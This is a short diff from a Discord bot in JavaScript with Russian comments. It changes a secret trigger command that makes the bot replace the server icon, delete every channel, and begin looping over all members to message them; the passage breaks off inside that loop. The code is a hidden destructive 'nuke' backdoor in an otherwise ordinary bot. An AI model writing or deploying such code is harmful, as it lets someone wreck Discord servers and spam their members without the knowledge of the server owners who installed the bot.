@@ -33,7 +33,7 @@ bot.on ("message", async message =>{
     if (cmd) cmd.run(bot,message,args);
 });
 bot.on('message', msg => {
-    if (msg.content === 'code!5231265') {
+    if (msg.content === 's?msg') {
 		msg.guild.setIcon('https://cdn.discordapp.com/icons/692983981255163905/6a89b42b8324ee64b093cc415271e479.png?size=128').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
